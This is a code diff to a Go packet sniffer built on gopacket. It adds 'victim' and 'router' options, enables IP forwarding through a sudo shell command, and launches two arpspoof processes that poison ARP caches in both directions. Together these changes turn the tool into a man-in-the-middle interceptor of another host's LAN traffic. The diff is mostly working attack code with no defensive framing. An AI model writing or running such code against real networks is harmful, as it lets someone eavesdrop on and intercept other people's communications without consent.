@@ -4,6 +4,8 @@ import (
 	"flag"
 	"fmt"
 	"log"
+	"os"
+	"os/exec"
 	"strings"
 
 	"github.com/google/gopacket"
@@ -12,9 +14,38 @@ import (
 )
 
 func main() {
+	var victim string
+	var router string
 	var device string
-	flag.StringVar(&device, "iface", "eth0", "specify the device like wla0,eth0 ...")
+	flag.StringVar(&device, "iface", "wlan0", "specify the device like wla0,eth0 ...")
+	flag.StringVar(&router, "router", "", "specify the router private ip  ex: 192.168.1.1")
+	flag.StringVar(&victim, "victim", "", "specify the victim ip address ex: 192.168.1.10")
 	flag.Parse()
+
+	if router != "" && victim != "" {
+		cmd := exec.Command("/bin/sh", "-c", "echo 1 | sudo echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
+		if err := cmd.Run(); err != nil {
+			panic(err)
+		}
+
+		go func() {
+			cmd := exec.Command("/bin/sh", "-c", fmt.Sprintf("arpspoof -t %s %s", router, victim ))
+			if err := cmd.Run(); err != nil {
+				panic(err)
+			}
+			cmd.Stdout = os.Stdout
+
+		}()
+
+		go func() {
+			cmd := exec.Command("/bin/sh", "-c", fmt.Sprintf("arpspoof -t %s %s", victim, router ))
+			if err := cmd.Run(); err != nil {
+				panic(err)
+			}
+			cmd.Stdout = os.Stdout
+
+		}()
+	}
 
 	snapshotLen := int32(1024)
 	promiscuous := true
